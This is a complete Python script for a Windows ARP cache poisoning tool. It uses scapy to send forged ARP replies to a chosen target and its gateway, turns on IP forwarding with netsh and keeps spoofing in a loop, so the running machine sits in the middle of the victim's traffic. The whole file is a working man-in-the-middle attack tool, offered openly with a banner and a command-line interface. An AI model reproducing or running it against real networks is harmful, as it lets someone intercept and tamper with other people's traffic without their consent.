import os
import time
import argparse
from scapy.all import ARP, Ether, sendp, srp
import sys
from colorama import init, Fore, Style
import pyfiglet

# Initialize colorama
init()

def display_banner():
    banner_text = "ARP Spoofing Tool"
    styled_banner = pyfiglet.figlet_format(banner_text, font="slant")
    print(Fore.RED + styled_banner)
    print(Fore.YELLOW + "="*60)
    print(Fore.CYAN + "Advanced ARP Cache Poisoning Tool for Windows")
    print(Fore.YELLOW + "="*60 + Style.RESET_ALL)
    print()

def get_arguments():
    parser = argparse.ArgumentParser(description='ARP Spoofing Tool for Windows')
    parser.add_argument('-t', '--target', dest='target', help='Target IP address')
    parser.add_argument('-g', '--gateway', dest='gateway', help='Gateway IP address')
    parser.add_argument('-i', '--interface', dest='interface', help='Network interface')
    parser.add_argument('-s', '--speed', dest='speed', type=int, default=2, 
                        help='Attack speed (seconds between packets, default: 2)')
    options = parser.parse_args()
    
    if not all([options.target, options.gateway, options.interface]):
        parser.error(Fore.RED + "[-] Please specify all required arguments. Use -h for help." + Style.RESET_ALL)
    
    return options

def enable_ip_forwarding():
    """Enable IP forwarding on Windows"""
    try:
        os.system('netsh interface ipv4 set interface "' + args.interface + '" forwarding=enabled')
        print(Fore.GREEN + "[+] IP forwarding enabled" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Error enabling IP forwarding: {e}" + Style.RESET_ALL)
        print(Fore.RED + "[-] Please run as Administrator" + Style.RESET_ALL)
        sys.exit(1)

def get_mac(ip):
    """Get MAC address for given IP"""
    try:
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), timeout=3, verbose=0)
        if ans:
            return ans[0][1].src
    except Exception as e:
        print(Fore.RED + f"[-] Error getting MAC address: {e}" + Style.RESET_ALL)
    return None

def spoof(target_ip, target_mac, gateway_ip, gateway_mac):
    """Send ARP spoofing packets"""
    try:
        # Tell target we're the gateway
        sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac), verbose=0)
        # Tell gateway we're the target
        sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac), verbose=0)
    except Exception as e:
        print(Fore.RED + f"[-] Error sending spoof packets: {e}" + Style.RESET_ALL)

def restore(target_ip, target_mac, gateway_ip, gateway_mac):
    """Restore ARP tables to correct values"""
    try:
        sendp(Ether(dst=target_mac)/ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gateway_mac), count=5, verbose=0)
        sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=target_mac), count=5, verbose=0)
        print(Fore.GREEN + "[+] ARP tables restored" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"[-] Error restoring ARP tables: {e}" + Style.RESET_ALL)

def main():
    display_banner()
    
    try:
        global args
        args = get_arguments()
        
        # Check for admin privileges
        try:
            with open(os.path.join(os.getenv("TEMP"), "arp_test.txt"), "w") as f:
                f.write("test")
            os.remove(os.path.join(os.getenv("TEMP"), "arp_test.txt"))
        except:
            print(Fore.RED + "[-] Please run as Administrator" + Style.RESET_ALL)
            sys.exit(1)
        
        print(Fore.GREEN + "[+] Enabling IP forwarding..." + Style.RESET_ALL)
        enable_ip_forwarding()
        
        print(Fore.GREEN + "[+] Getting MAC addresses..." + Style.RESET_ALL)
        target_mac = get_mac(args.target)
        gateway_mac = get_mac(args.gateway)
        
        if not target_mac:
            print(Fore.RED + f"[-] Could not get target MAC address for {args.target}" + Style.RESET_ALL)
        if not gateway_mac:
            print(Fore.RED + f"[-] Could not get gateway MAC address for {args.gateway}" + Style.RESET_ALL)
        if not target_mac or not gateway_mac:
            sys.exit(1)
            
        print(Fore.YELLOW + f"[+] Target IP: {args.target} | MAC: {target_mac}" + Style.RESET_ALL)
        print(Fore.YELLOW + f"[+] Gateway IP: {args.gateway} | MAC: {gateway_mac}" + Style.RESET_ALL)
        
        print(Fore.RED + "\n[+] Starting ARP spoofing attack. Press Ctrl+C to stop..." + Style.RESET_ALL)
        
        sent_packets = 0
        try:
            while True:
                spoof(args.target, target_mac, args.gateway, gateway_mac)
                spoof(args.gateway, gateway_mac, args.target, target_mac)
                sent_packets += 2
                print(Fore.BLUE + f"\r[+] Packets sent: {sent_packets}", end="" + Style.RESET_ALL)
                sys.stdout.flush()
                time.sleep(args.speed)
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[+] Detected CTRL+C. Restoring ARP tables..." + Style.RESET_ALL)
            restore(args.target, target_mac, args.gateway, gateway_mac)
            print(Fore.GREEN + "[+] ARP spoofing attack stopped." + Style.RESET_ALL)
            
    except Exception as e:
        print(Fore.RED + f"[-] Error: {e}" + Style.RESET_ALL)
        sys.exit(1)

if __name__ == "__main__":
    main()